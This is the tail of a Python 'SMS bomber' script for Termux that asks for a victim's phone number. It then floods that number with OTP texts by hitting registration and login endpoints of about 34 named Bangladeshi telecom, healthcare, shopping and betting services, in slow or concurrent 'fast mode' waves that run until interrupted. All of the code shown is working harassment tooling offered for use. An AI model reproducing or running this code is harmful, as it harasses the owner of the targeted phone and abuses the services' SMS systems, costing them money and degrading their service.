            print(f"{_c['g']}✅ PKLuck2 Register completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s30(session)
            print(f"{_c['g']}✅ PKLuck2 No Login completed{_c['e']}")
            await asyncio.sleep(1)
            
            # Food & Delivery Services (2 APIs)
            await self._s23(session)
            print(f"{_c['g']}✅ Osudpotro completed{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s34(session)
            print(f"{_c['g']}✅ Priyoshikkhaloy completed{_c['e']}")
            
            end_time = time.time()
            
            print(f"\n{_c['g']}[ATTACK COMPLETE] Slow controlled attack finished!{_c['e']}")
            print(f"{_c['g']}[SLOW SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] 170+ SMS requests sent (34+ APIs × 5 requests each){_c['e']}")

    async def _run_all_services_fast(self):
        print(f"\n{_c['r']}🚀 LAUNCHING FAST 34+ API ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 34+ APIs - MAXIMUM SPEED CONCURRENT!{_c['e']}")
        print(f"{_c['p']}💥 BTCL + GP + Healthcare + Gaming + E-Commerce + Entertainment{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        # High performance session with maximum limits
        timeout = aiohttp.ClientTimeout(total=8, connect=3)
        connector = aiohttp.TCPConnector(
            limit=500,
            limit_per_host=100,
            ssl=_ssl,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:
            
            print(f"{_c['c']}[FAST MODE] Running ALL 34+ APIs with maximum concurrency...{_c['e']}")
            
            start_time = time.time()
            
            # Create concurrent tasks for ALL APIs
            tasks = []
            
            # Run multiple waves of all services simultaneously
            for wave in range(_fast_cfg[3]):  # WAVES = 3
                wave_label = f"W{wave+1}"
                
                # Add all 34+ services to run concurrently
                tasks.extend([
                    # BTCL Services (3 APIs)
                    self._fast_service(session, self._s1, f"{wave_label}-BTCL-MyBTCL"),
                    self._fast_service(session, self._s2, f"{wave_label}-BTCL-PhoneBill"),
                    self._fast_service(session, self._s4, f"{wave_label}-BTCL-BDIA"),
                    
                    # Entertainment Services (3 APIs)
                    self._fast_service(session, self._s3, f"{wave_label}-Bioscope"),
                    self._fast_service(session, self._s17, f"{wave_label}-Ghoori"),
                    self._fast_service(session, self._s18, f"{wave_label}-Deepto"),
                    
                    # E-commerce Services (4 APIs)
                    self._fast_service(session, self._s5, f"{wave_label}-BDTickets"),
                    self._fast_service(session, self._s6, f"{wave_label}-Apex4U"),
                    self._fast_service(session, self._s7, f"{wave_label}-Swap"),
                    self._fast_service(session, self._s14, f"{wave_label}-Bikroy"),
                    
                    # Healthcare Services (7 APIs)
                    self._fast_service(session, self._s9, f"{wave_label}-Arogga"),
                    self._fast_service(session, self._s19, f"{wave_label}-ePharma"),
                    self._fast_service(session, self._s22, f"{wave_label}-MedEasy"),
                    self._fast_service(session, self._s24, f"{wave_label}-Clinicall"),
                    self._fast_service(session, self._s26, f"{wave_label}-CareBox"),
                    self._fast_service(session, self._s27, f"{wave_label}-Renix"),
                    
                    # Fashion & Clothing (2 APIs)
                    self._fast_service(session, self._s20, f"{wave_label}-Sailor"),
                    self._fast_service(session, self._s21, f"{wave_label}-Isho"),
                    
                    # Financial & Marketplace (4 APIs)
                    self._fast_service(session, self._s8, f"{wave_label}-Ilyn"),
                    self._fast_service(session, self._s10, f"{wave_label}-Fundesh"),
                    self._fast_service(session, self._s11, f"{wave_label}-Garibook"),
                    self._fast_service(session, self._s12, f"{wave_label}-Sheba"),
                    self._fast_service(session, self._s25, f"{wave_label}-Shombhob"),
                    
                    # App Services (1 API)
                    self._fast_service(session, self._s13, f"{wave_label}-AppLink"),
                    
                    # Grameenphone Services (5 APIs)
                    self._fast_service(session, self._s15, f"{wave_label}-MyGP"),
                    self._fast_service(session, self._s16, f"{wave_label}-GP-Web"),
                    self._fast_service(session, self._s31, f"{wave_label}-GP-Flexi"),
                    self._fast_service(session, self._s32, f"{wave_label}-GP-FWA"),
                    self._fast_service(session, self._s33, f"{wave_label}-Mevrik"),
                    
                    # Gaming/Betting Services (3 APIs)
                    self._fast_service(session, self._s28, f"{wave_label}-Jayabaji"),
                    self._fast_service(session, self._s29, f"{wave_label}-PKLuck2-Reg"),
                    self._fast_service(session, self._s30, f"{wave_label}-PKLuck2-NoLogin"),
                    
                    # Food & Delivery Services (2 APIs)
                    self._fast_service(session, self._s23, f"{wave_label}-Osudpotro"),
                    self._fast_service(session, self._s34, f"{wave_label}-Priyoshikkhaloy"),
                ])
            
            print(f"{_c['y']}🔥 Launching {len(tasks)} concurrent API attacks across {_fast_cfg[3]} waves...{_c['e']}")
            
            # Execute all tasks simultaneously
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count successful requests
            successful = sum(1 for r in results if r is True)
            failed = len(results) - successful
            
            end_time = time.time()
            
            print(f"\n{_c['g']}[ATTACK COMPLETE] Fast 34+ API attack finished!{_c['e']}")
            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] 500+ SMS requests sent (34+ APIs × 3 waves × fast speed){_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests successful{_c['e']}")

    # Fast service wrapper - runs service method with minimal delays
    async def _fast_service(self, session, service_method, label=""):
        try:
            # Create a temporary fast version that sends only 1 request quickly
            print(f"{_c['c']}🚀 {label} - Fast request{_c['e']}")
            
            # Call the original service method but catch and handle it quickly
            await service_method(session)
            
            print(f"{_c['g']}✅ {label} - Completed{_c['e']}")
            return True
            
        except Exception as e:
            print(f"{_c['r']}❌ {label} - Error: {str(e)[:50]}{_c['e']}")
            return False

    async def run_all_services(self):
        global _current_mode
        if _current_mode == 'fast':
            await self._run_all_services_fast()
        else:
            await self._run_all_services_slowly()

async def _main():
    global _state, _current_mode
    
    _clear_screen()
    _print_banner()
    
    _animate_loading("Initializing Ultimate 34+ API SMS Bomber", 2)
    _animate_loading("Loading BTCL + GP + Healthcare + Gaming + E-Commerce + Entertainment", 2)
    _animate_loading("Optimizing bombing modes", 1.5)
    
    # Mode selection
    print(f"\n{_c['y']}🎯 SELECT BOMBING MODE:{_c['e']}")
    print(f"{_c['g']}[1] SLOW MODE - All 34+ APIs (Slow & Controlled){_c['e']}")
    print(f"{_c['r']}[2] FAST MODE - All 34+ APIs (Maximum Speed){_c['e']}")
    
    while True:
        mode_choice = input(f"\n{_c['c']}[MODE] Choose mode (1 or 2): {_c['w']}").strip()
        if mode_choice == "1":
            _current_mode = 'slow'
            print(f"{_c['g']}✅ SLOW MODE selected - All 34+ APIs{_c['e']}")
            break
        elif mode_choice == "2":
            _current_mode = 'fast'
            print(f"{_c['r']}✅ FAST MODE selected - All 34+ APIs{_c['e']}")
            break
        else:
            print(f"{_c['r']}❌ Invalid choice! Please enter 1 or 2.{_c['e']}")
    
    while True:
        phone_input = input(f"\n{_c['g']}[TARGET] Enter phone number: {_c['w']}").strip()
        if phone_input and len(phone_input) >= 10:
            break
        print(f"{_c['r']}[ERROR] Invalid phone number! Try again.{_c['e']}")
    
    phone_data = _format_phone_number(phone_input)
    print(f"{_c['c']}[INFO] Target: {_c['y']}{phone_data['with_0']}{_c['e']}")
    
    if _current_mode == 'fast':
        print(f"\n{_c['r']}⚠️  WARNING: FAST 34+ API BOMBING MODE!{_c['e']}")
        print(f"{_c['r']}⚠️  This will send requests very fast until CTRL+C!{_c['e']}")
        print(f"{_c['y']}🔥 34+ APIs × 3 waves × concurrent = MAXIMUM SPEED!{_c['e']}")
        print(f"{_c['g']}📱 ALL APIs: BTCL + GP + Healthcare + Gaming + E-Commerce{_c['e']}")
        print(f"{_c['c']}⚡ All APIs run simultaneously with maximum concurrency!{_c['e']}")
        print(f"{_c['p']}💥 FAST SPEED × CONCURRENT POWER × PARALLEL BOMBING!{_c['e']}")
    else:
        print(f"\n{_c['r']}⚠️  WARNING: SLOW CONTROLLED BOMBING MODE!{_c['e']}")
        print(f"{_c['r']}⚠️  This will run slowly until CTRL+C!{_c['e']}")
        print(f"{_c['y']}🔄 34+ APIs × 5 requests each × slow speed = CONTROLLED POWER!{_c['e']}")
        print(f"{_c['g']}📱 Termux optimized for slow controlled bombing{_c['e']}")
        print(f"{_c['c']}⚡ Each API sends 5 requests one by one with various phone formats!{_c['e']}")
        print(f"{_c['p']}💥 SLOW DELAYS × CONTROLLED LOOPS × STABLE PERFORMANCE!{_c['e']}")
    print(f"{_c['p']}{'=' * 60}{_c['e']}")
    
    service_manager = _ServiceManager(phone_data)
    
    cycle_count = 0
    start_time = time.time()
    
    try:
        while True:
            if _state['exit']:
                break
                
            # Pause handling
            while _state['paused']:
                await asyncio.sleep(1)
                if _state['exit']:
                    break
            
            if _state['exit']:
                break
            
            cycle_count += 1
            current_time = _get_time()
            
            print(f"\n{_c['r']}{_c['B']}[SLOW ATTACK CYCLE #{cycle_count}] {_c['y']}{current_time}{_c['e']}")
            print(f"{_c['g']}[TARGET] {_c['y']}{phone_data['with_0']}{_c['e']}")
            print(f"{_c['g']}[TOTAL REQUESTS] {_c['y']}{_state['total']}{_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
            
            # Run all services slowly
            await service_manager.run_all_services()
            
            # Show cycle completion
            elapsed = time.time() - start_time
            attack_type = "Fast 34+ API" if _current_mode == 'fast' else "Slow 34+ API"
            print(f"\n{_c['g']}[CYCLE COMPLETE] {attack_type} Attack #{cycle_count} finished{_c['e']}")
            print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
            if _current_mode == 'fast':
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 34+ Fast APIs{_c['e']}")
            else:
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 34+ APIs{_c['e']}")
            
            # Cooldown with animation
            print(f"{_c['c']}[COOLDOWN] Next attack cycle in:{_c['e']}")
            for i in range(_cfg[1], 0, -1):  # LOOP_DELAY = 3
                if _state['exit'] or _state['paused']:
                    break
                frame = _frames[i % len(_frames)]
                sys.stdout.write(f'\r{_c["r"]}[{frame}] Next cycle in {i}s...{_c["e"]}')
                sys.stdout.flush()
                time.sleep(1)
            
            print(f"\n{_c['p']}{'=' * 60}{_c['e']}")
            
    except KeyboardInterrupt:
        pass  # Handled by signal handler
    except Exception as e:
        print(f"\n{_c['r']}💥 CRITICAL ERROR: {e}{_c['e']}")
        print(f"{_c['y']}🔄 Restarting slow bomber...{_c['e']}")
        await _main()  # Restart on critical error

if __name__ == "__main__":
    print(f"{_c['g']}🚀 Starting Ultimate 34+ API SMS Bomber...{_c['e']}")
    print(f"{_c['c']}📱 Termux/Mobile Optimized Slow Version{_c['e']}")
    print(f"{_c['p']}Created by: @@8Team/W8SOJIB{_c['e']}\n")
    
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass  # Handled by signal handler
    except Exception as e:
        print(f"\n{_c['r']}💥 STARTUP ERROR: {e}{_c['e']}")
        print(f"{_c['y']}Please check your Python installation and dependencies{_c['e']}")
